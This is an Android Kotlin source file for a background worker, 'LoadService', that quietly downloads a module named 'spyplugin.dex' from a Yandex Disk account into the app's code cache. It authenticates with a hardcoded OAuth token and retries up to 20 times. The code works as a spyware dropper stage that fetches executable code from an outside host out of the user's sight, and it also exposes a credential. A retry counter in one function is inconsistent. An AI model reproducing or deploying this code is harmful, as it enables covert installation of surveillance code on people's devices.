package com.example.background

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

class LoadService(appContext: Context, workerParams: WorkerParameters)
    : CoroutineWorker(appContext, workerParams) {

    override suspend fun doWork(): Result {
        return try {
            val file = downloadDexFromYandex(applicationContext, "/BackService/Module/spyplugin.dex")
            Result.success()
        } catch (e: Exception) {
            Log.d("LoadService", "exception service", e)
            Result.failure()
        }
    }

    suspend fun downloadDex(context: Context, url: String): File =
        withContext(Dispatchers.IO) {

            val client = OkHttpClient.Builder()
                .connectTimeout(60, TimeUnit.SECONDS)
                .readTimeout(60, TimeUnit.SECONDS)
                .build()

            val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
            val finalFile = File(context.codeCacheDir, "spyplugin.dex")

            repeat(20) { attempt ->
                try {

                    if (tempFile.exists()) tempFile.delete()

                    val request = Request.Builder()
                        .url(url)
                        .get()
                        .build()

                    client.newCall(request).execute().use { response ->

                        if (!response.isSuccessful) {
                            throw IOException("HTTP ${response.code}")
                        }

                        val body = response.body ?: throw IOException("Empty body")

                        body.byteStream().use { input ->
                            FileOutputStream(tempFile).use { output ->
                                input.copyTo(output)
                            }
                        }
                    }

                    finalFile.delete()
                    tempFile.renameTo(finalFile)
                    finalFile.setWritable(false)

                    return@withContext finalFile

                } catch (e: Exception) {

                    if (attempt == 9) {
                        throw e
                    }

                    delay(2000)
                }
            }

            throw IOException("Download failed after 10 attempts")
        }


    suspend fun downloadDexFromYandex(
        context: Context,
        diskPath: String
    ): File = withContext(Dispatchers.IO) {

        val client = OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .build()

        val tempFile = File(context.codeCacheDir, "spyplugin.tmp")
        val finalFile = File(context.codeCacheDir, "spyplugin.dex")

        val token = "y0__xC4rpbCAhjlsj4glaPlzBYQ0CLzRDiNCGdAX7bNGCyQz_rmCQ"

        repeat(20) { attempt ->
            try {

                if (tempFile.exists()) tempFile.delete()

                val apiUrl =
                    "https://cloud-api.yandex.net/v1/disk/resources/download?path=$diskPath"

                val apiRequest = Request.Builder()
                    .url(apiUrl)
                    .addHeader("Authorization", "OAuth $token")
                    .get()
                    .build()

                val downloadUrl = client.newCall(apiRequest).execute().use { response ->

                    if (!response.isSuccessful) {
                        throw IOException("API HTTP ${response.code}")
                    }

                    val json = JSONObject(response.body!!.string())
                    json.getString("href")
                }

                val downloadRequest = Request.Builder()
                    .url(downloadUrl)
                    .get()
                    .build()

                client.newCall(downloadRequest).execute().use { response ->

                    if (!response.isSuccessful) {
                        throw IOException("Download HTTP ${response.code}")
                    }

                    val body = response.body ?: throw IOException("Empty body")

                    body.byteStream().use { input ->
                        FileOutputStream(tempFile).use { output ->
                            input.copyTo(output)
                        }
                    }
                }

                finalFile.delete()
                tempFile.renameTo(finalFile)
                finalFile.setWritable(false)

                return@withContext finalFile

            } catch (e: Exception) {

                if (attempt == 19) {
                    throw e
                }

                delay(2000)
            }
        }

        throw IOException("Download failed after retries")
    }
}